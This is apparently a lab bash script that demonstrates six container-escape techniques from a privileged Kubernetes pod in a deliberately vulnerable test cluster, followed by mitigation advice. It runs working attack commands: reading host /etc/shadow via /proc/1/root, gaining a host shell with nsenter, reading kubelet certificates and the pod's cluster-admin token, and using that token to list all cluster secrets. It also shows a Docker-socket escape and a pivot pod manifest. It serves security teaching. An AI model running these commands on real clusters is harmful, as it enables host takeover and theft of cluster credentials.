#!/usr/bin/env bash
# =============================================================================
# Container Escape Demonstration Script
# =============================================================================
#
# PURPOSE: Demonstrates multiple container escape techniques from a privileged
# Kubernetes pod. Each technique shows how an attacker can break out of
# container isolation to access the underlying host.
#
# PREREQUISITES:
#   - Vulnerable Kind cluster running (../setup-vulnerable-cluster.sh create)
#   - kubectl configured for the cluster
#   - 'insecure-ns' namespace exists
#
# USAGE:
#   ./escape-demo.sh [DEMO_NUMBER]
#
#   Without arguments: runs all demos in sequence
#   With argument:     runs only the specified demo (1-6)
#
# WARNING: For AUTHORIZED SECURITY TESTING AND EDUCATION ONLY.
#
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
NAMESPACE="insecure-ns"
POD_NAME="escape-pod"
CONTAINER_NAME="escape-container"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[INFO]${NC}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}    $*"; }
log_error()   { echo -e "${RED}[ERROR]${NC}   $*"; }
log_attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
log_explain() { echo -e "${CYAN}[EXPLAIN]${NC} $*"; }
log_cmd()     { echo -e "${MAGENTA}[CMD]${NC}     $*"; }

section() {
    echo ""
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE} $*${NC}"
    echo -e "${BLUE}=================================================================${NC}"
    echo ""
}

pause() {
    echo ""
    echo -e "${YELLOW}Press Enter to continue to the next step...${NC}"
    read -r
}

# ---------------------------------------------------------------------------
# Deploy the privileged pod
# ---------------------------------------------------------------------------
deploy_pod() {
    section "Deploying Privileged Escape Pod"

    log_explain "We are deploying a pod with these dangerous settings:"
    log_explain "  - privileged: true (disables ALL container isolation)"
    log_explain "  - hostPID: true   (sees all host processes)"
    log_explain "  - hostNetwork: true (shares host network stack)"
    log_explain "  - hostPath: /     (mounts entire host filesystem)"
    log_explain "  - Docker socket mounted"
    echo ""

    # Check if pod already exists
    if kubectl get pod "${POD_NAME}" -n "${NAMESPACE}" &>/dev/null; then
        log_info "Pod '${POD_NAME}' already exists. Deleting and recreating..."
        kubectl delete pod "${POD_NAME}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
        sleep 3
    fi

    log_cmd "kubectl apply -f ${SCRIPT_DIR}/privileged-pod.yaml"
    kubectl apply -f "${SCRIPT_DIR}/privileged-pod.yaml"

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${POD_NAME}" -n "${NAMESPACE}" --timeout=120s

    log_info "Pod is running. Checking security context..."
    echo ""

    # Show the pod's security settings
    log_cmd "kubectl get pod ${POD_NAME} -n ${NAMESPACE} -o jsonpath='{.spec}' | jq '.hostPID, .hostNetwork, .hostIPC'"
    echo -n "  hostPID:     "; kubectl get pod "${POD_NAME}" -n "${NAMESPACE}" -o jsonpath='{.spec.hostPID}'; echo ""
    echo -n "  hostNetwork: "; kubectl get pod "${POD_NAME}" -n "${NAMESPACE}" -o jsonpath='{.spec.hostNetwork}'; echo ""
    echo -n "  hostIPC:     "; kubectl get pod "${POD_NAME}" -n "${NAMESPACE}" -o jsonpath='{.spec.hostIPC}'; echo ""
    echo -n "  privileged:  "; kubectl get pod "${POD_NAME}" -n "${NAMESPACE}" -o jsonpath='{.spec.containers[0].securityContext.privileged}'; echo ""
    echo ""
}

# ---------------------------------------------------------------------------
# DEMO 1: Access host filesystem via /proc/1/root
# ---------------------------------------------------------------------------
demo_proc_escape() {
    section "DEMO 1: Host Filesystem Access via /proc/1/root"

    log_explain "In a container with hostPID=true, PID 1 is the HOST's init process."
    log_explain "/proc/1/root points to the HOST's root filesystem."
    log_explain "A privileged container can traverse this to access ANY host file."
    echo ""

    log_attack "Step 1: Verify we are inside a container"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- cat /container-marker.txt 2>/dev/null || echo '(no marker - using default image)'"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- bash -c 'echo "Hostname: $(hostname)"; echo "PID namespace: $(ls /proc/1/ns/pid 2>/dev/null)"' || true
    echo ""

    log_attack "Step 2: Access the HOST filesystem through /proc/1/root"
    log_explain "Because hostPID is true, /proc/1/root leads to the host's root FS."
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- ls /proc/1/root/"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- ls /proc/1/root/ 2>/dev/null || true
    echo ""

    log_attack "Step 3: Read the HOST's /etc/hostname (proves we escaped)"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- cat /proc/1/root/etc/hostname"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- cat /proc/1/root/etc/hostname 2>/dev/null || true
    echo ""

    log_attack "Step 4: Read the HOST's /etc/shadow (password hashes)"
    log_explain "This file contains password hashes for all host users."
    log_explain "An attacker could crack these offline to gain host login access."
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- head -5 /proc/1/root/etc/shadow"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- head -5 /proc/1/root/etc/shadow 2>/dev/null || echo "(access denied or file not found)"
    echo ""

    log_attack "Step 5: Read the HOST's /etc/os-release"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- cat /proc/1/root/etc/os-release"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- cat /proc/1/root/etc/os-release 2>/dev/null || true
    echo ""

    log_warn "IMPACT: Full read/write access to the host filesystem."
    log_warn "An attacker can read secrets, modify configs, install backdoors."
}

# ---------------------------------------------------------------------------
# DEMO 2: nsenter to get a host shell
# ---------------------------------------------------------------------------
demo_nsenter_escape() {
    section "DEMO 2: Host Shell via nsenter"

    log_explain "nsenter allows entering the namespaces of another process."
    log_explain "By targeting PID 1 (host's init), we enter ALL host namespaces."
    log_explain "This gives us a full root shell on the host."
    echo ""

    log_attack "Step 1: Use nsenter to run commands in the HOST's namespaces"
    log_explain "Flags: -t 1 (target PID 1 = host init)"
    log_explain "       -m (mount namespace)  -u (UTS namespace)"
    log_explain "       -i (IPC namespace)    -n (network namespace)"
    log_explain "       -p (PID namespace)"
    echo ""

    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- nsenter -t 1 -m -u -i -n -p -- hostname"
    echo -n "  Host hostname: "
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- nsenter -t 1 -m -u -i -n -p -- hostname 2>/dev/null || echo "(failed)"
    echo ""

    log_attack "Step 2: List HOST processes (we can see everything)"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- nsenter -t 1 -m -u -i -n -p -- ps aux | head -20"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- nsenter -t 1 -m -u -i -n -p -- ps aux 2>/dev/null | head -20 || true
    echo ""

    log_attack "Step 3: Show HOST network interfaces"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- nsenter -t 1 -m -u -i -n -p -- ip addr show"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- nsenter -t 1 -m -u -i -n -p -- ip addr show 2>/dev/null | head -30 || true
    echo ""

    log_attack "Step 4: List HOST containers (Docker/containerd)"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- nsenter -t 1 -m -u -i -n -p -- crictl ps 2>/dev/null || nsenter -t 1 -m -u -i -n -p -- docker ps 2>/dev/null"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- nsenter -t 1 -m -u -i -n -p -- sh -c 'crictl ps 2>/dev/null || docker ps 2>/dev/null || echo "No container runtime CLI found"' || true
    echo ""

    log_warn "IMPACT: Full root shell on the host node."
    log_warn "The attacker IS the host at this point."
}

# ---------------------------------------------------------------------------
# DEMO 3: Docker socket access
# ---------------------------------------------------------------------------
demo_docker_socket() {
    section "DEMO 3: Docker Socket Access"

    log_explain "If the Docker socket (/var/run/docker.sock) is mounted into"
    log_explain "a container, the attacker can control the container runtime."
    log_explain "They can create new privileged containers, access host filesystems,"
    log_explain "or even replace existing containers with malicious ones."
    echo ""

    log_attack "Step 1: Check if Docker socket is available"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- ls -la /var/run/docker.sock"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- ls -la /var/run/docker.sock 2>/dev/null || echo "  Docker socket not found (cluster may use containerd)"
    echo ""

    log_attack "Step 2: Try to list containers via Docker socket"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- docker ps --format 'table {{.ID}}\t{{.Image}}\t{{.Status}}'"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'docker ps --format "table {{.ID}}\t{{.Image}}\t{{.Status}}" 2>/dev/null | head -10 || echo "Docker not available (may use containerd instead)"' || true
    echo ""

    log_attack "Step 3: Demonstrate spawning a host-access container (DRY RUN)"
    log_explain "An attacker would run a command like this to get host access:"
    echo -e "${RED}  docker run -it --privileged --pid=host --net=host -v /:/hostfs alpine chroot /hostfs${NC}"
    log_explain "(NOT executing this - just showing the technique)"
    echo ""

    log_warn "IMPACT: Full control over the container runtime."
    log_warn "Can spawn arbitrary containers with host access."
}

# ---------------------------------------------------------------------------
# DEMO 4: Read kubelet credentials and secrets
# ---------------------------------------------------------------------------
demo_credential_theft() {
    section "DEMO 4: Kubelet Credential & Secret Theft"

    log_explain "The kubelet stores credentials and configuration that can be"
    log_explain "used to authenticate to the Kubernetes API as the node."
    log_explain "Node-level access allows reading secrets, impersonating pods, etc."
    echo ""

    log_attack "Step 1: Read kubelet configuration"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- cat /host/var/lib/kubelet/config.yaml 2>/dev/null | head -30"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'cat /host/var/lib/kubelet/config.yaml 2>/dev/null | head -30 || cat /var/lib/kubelet/config.yaml 2>/dev/null | head -30 || echo "Kubelet config not found at expected path"' || true
    echo ""

    log_attack "Step 2: Look for kubelet client certificates"
    log_explain "These certificates authenticate the kubelet to the API server."
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- find /host/var/lib/kubelet/pki/ -type f 2>/dev/null"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'find /host/var/lib/kubelet/pki/ -type f 2>/dev/null || find /var/lib/kubelet/pki/ -type f 2>/dev/null || echo "PKI directory not found"' || true
    echo ""

    log_attack "Step 3: Read the ServiceAccount token mounted in this pod"
    log_explain "This token has cluster-admin privileges (attack-sa)."
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    local token
    token=$(kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")
    if [[ -n "$token" ]]; then
        echo "  Token (first 50 chars): ${token:0:50}..."
        echo ""
        log_explain "With this token, an attacker can authenticate to the API server"
        log_explain "and perform ANY action (it is bound to cluster-admin)."
    else
        echo "  Token not found (automountServiceAccountToken may be false)"
    fi
    echo ""

    log_attack "Step 4: Use stolen credentials to access the API server"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets -A"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c '
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        if [ -n "$TOKEN" ]; then
            kubectl --server=https://kubernetes.default.svc \
                    --token="$TOKEN" \
                    --insecure-skip-tls-verify \
                    get secrets -A 2>/dev/null | head -20
        else
            echo "No token available"
        fi
    ' || echo "  API access failed"
    echo ""

    log_warn "IMPACT: Full cluster compromise via stolen credentials."
    log_warn "Attacker can read all secrets, deploy workloads, etc."
}

# ---------------------------------------------------------------------------
# DEMO 5: Pivot to other nodes
# ---------------------------------------------------------------------------
demo_node_pivot() {
    section "DEMO 5: Lateral Movement / Pivot to Other Nodes"

    log_explain "Once on a node, an attacker can pivot to other nodes by:"
    log_explain "  1. Using stolen kubelet credentials to create pods on other nodes"
    log_explain "  2. Reading SSH keys from the host"
    log_explain "  3. Exploiting the flat pod network (no network policies)"
    log_explain "  4. Accessing node-to-node communication channels"
    echo ""

    log_attack "Step 1: List all cluster nodes"
    log_cmd "kubectl get nodes -o wide"
    kubectl get nodes -o wide 2>/dev/null || true
    echo ""

    log_attack "Step 2: Check for SSH keys on the host"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- find /host/root/.ssh/ -type f 2>/dev/null"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'find /host/root/.ssh/ -type f 2>/dev/null || echo "No SSH keys found at /host/root/.ssh/"' || true
    echo ""

    log_attack "Step 3: Scan internal network for other nodes"
    log_explain "With hostNetwork=true, we see the host's network and can scan."
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- sh -c 'ip route | head -5'"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'ip route 2>/dev/null | head -5 || echo "ip command not available"' || true
    echo ""

    log_attack "Step 4: Deploy a privileged pod on ANOTHER node (dry run)"
    log_explain "Using stolen cluster-admin credentials, an attacker can schedule"
    log_explain "a privileged pod on any node using nodeSelector or nodeName."
    echo ""
    echo -e "${RED}  # Example: deploy escape pod on specific node${NC}"
    echo -e "${RED}  kubectl apply -f - <<EOF${NC}"
    echo -e "${RED}  apiVersion: v1${NC}"
    echo -e "${RED}  kind: Pod${NC}"
    echo -e "${RED}  metadata:${NC}"
    echo -e "${RED}    name: pivot-pod${NC}"
    echo -e "${RED}  spec:${NC}"
    echo -e "${RED}    nodeName: TARGET_NODE_NAME${NC}"
    echo -e "${RED}    hostPID: true${NC}"
    echo -e "${RED}    containers:${NC}"
    echo -e "${RED}    - name: pivot${NC}"
    echo -e "${RED}      image: ubuntu:22.04${NC}"
    echo -e "${RED}      securityContext:${NC}"
    echo -e "${RED}        privileged: true${NC}"
    echo -e "${RED}  EOF${NC}"
    echo ""

    log_warn "IMPACT: Full cluster compromise across ALL nodes."
    log_warn "Every node becomes a stepping stone to the next."
}

# ---------------------------------------------------------------------------
# DEMO 6: Kernel module loading (extreme)
# ---------------------------------------------------------------------------
demo_kernel_module() {
    section "DEMO 6: Kernel Module Loading (SYS_MODULE capability)"

    log_explain "With CAP_SYS_MODULE, a privileged container can load arbitrary"
    log_explain "kernel modules into the HOST kernel. This allows:"
    log_explain "  - Installing rootkits"
    log_explain "  - Hiding processes and files"
    log_explain "  - Keylogging"
    log_explain "  - Network traffic interception"
    echo ""

    log_attack "Step 1: Check if we can load kernel modules"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- ls /host/lib/modules/"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- sh -c 'ls /host/lib/modules/ 2>/dev/null || ls /lib/modules/ 2>/dev/null || echo "Modules directory not accessible"' || true
    echo ""

    log_attack "Step 2: List currently loaded kernel modules"
    log_cmd "kubectl exec ${POD_NAME} -n ${NAMESPACE} -- nsenter -t 1 -m -- lsmod | head -15"
    kubectl exec "${POD_NAME}" -n "${NAMESPACE}" -- nsenter -t 1 -m -- sh -c 'lsmod 2>/dev/null | head -15 || cat /proc/modules 2>/dev/null | head -15 || echo "Cannot list modules"' || true
    echo ""

    log_explain "An attacker could compile and load a malicious kernel module"
    log_explain "that hides their presence entirely from the operating system."
    log_explain "(Not demonstrating actual module loading for safety reasons.)"
    echo ""

    log_warn "IMPACT: Complete and persistent host compromise at the kernel level."
    log_warn "This is the most severe form of container escape."
}

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
summary() {
    section "Summary of Container Escape Demonstrations"

    echo -e "${RED}All of these escapes were possible because of dangerous pod settings:${NC}"
    echo ""
    echo "  1. privileged: true        --> Disables all container isolation"
    echo "  2. hostPID: true           --> /proc/1/root = host filesystem"
    echo "  3. hostNetwork: true       --> Full host network access"
    echo "  4. Host path mounts        --> Direct filesystem access"
    echo "  5. Docker socket mount     --> Container runtime control"
    echo "  6. ALL capabilities        --> Kernel module loading, etc."
    echo "  7. No seccomp/AppArmor     --> No syscall restrictions"
    echo "  8. cluster-admin SA        --> Full API server access"
    echo ""
    echo -e "${GREEN}Prevention (see mitigation.md for details):${NC}"
    echo ""
    echo "  1. Use Pod Security Standards (restricted profile)"
    echo "  2. Never allow privileged containers"
    echo "  3. Never mount host paths or Docker socket"
    echo "  4. Drop ALL capabilities, add only what is needed"
    echo "  5. Use seccomp profiles (RuntimeDefault or custom)"
    echo "  6. Use AppArmor or SELinux profiles"
    echo "  7. Enforce with OPA/Gatekeeper admission policies"
    echo "  8. Use minimal RBAC (never cluster-admin for pods)"
    echo "  9. Deploy runtime security (Falco) for detection"
    echo ""
}

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
cleanup() {
    section "Cleanup"
    log_info "Deleting escape pod..."
    kubectl delete pod "${POD_NAME}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
    log_info "Cleanup complete."
}

# ---------------------------------------------------------------------------
# Usage
# ---------------------------------------------------------------------------
usage() {
    echo "Usage: $0 [OPTIONS] [DEMO_NUMBER]"
    echo ""
    echo "Options:"
    echo "  --no-deploy    Skip pod deployment (pod must already exist)"
    echo "  --no-cleanup   Skip cleanup at the end"
    echo "  --cleanup-only Just clean up existing pods"
    echo "  --help         Show this help message"
    echo ""
    echo "Demo Numbers:"
    echo "  1    Host filesystem access via /proc/1/root"
    echo "  2    Host shell via nsenter"
    echo "  3    Docker socket access"
    echo "  4    Kubelet credential theft"
    echo "  5    Lateral movement to other nodes"
    echo "  6    Kernel module loading"
    echo "  all  Run all demos (default)"
    echo ""
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
main() {
    local deploy=true
    local do_cleanup=true
    local demo="all"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --no-deploy)   deploy=false; shift ;;
            --no-cleanup)  do_cleanup=false; shift ;;
            --cleanup-only) cleanup; exit 0 ;;
            --help|-h)     usage; exit 0 ;;
            *)             demo="$1"; shift ;;
        esac
    done

    echo -e "${RED}"
    echo "============================================================"
    echo " CONTAINER ESCAPE DEMONSTRATION"
    echo " FOR AUTHORIZED SECURITY TESTING ONLY"
    echo "============================================================"
    echo -e "${NC}"

    # Deploy if needed
    if [[ "$deploy" == "true" ]]; then
        deploy_pod
    fi

    # Run requested demos
    case "$demo" in
        1) demo_proc_escape ;;
        2) demo_nsenter_escape ;;
        3) demo_docker_socket ;;
        4) demo_credential_theft ;;
        5) demo_node_pivot ;;
        6) demo_kernel_module ;;
        all)
            demo_proc_escape
            pause
            demo_nsenter_escape
            pause
            demo_docker_socket
            pause
            demo_credential_theft
            pause
            demo_node_pivot
            pause
            demo_kernel_module
            summary
            ;;
        *)
            log_error "Unknown demo: $demo"
            usage
            exit 1
            ;;
    esac

    # Cleanup
    if [[ "$do_cleanup" == "true" ]]; then
        cleanup
    fi
}

main "$@"
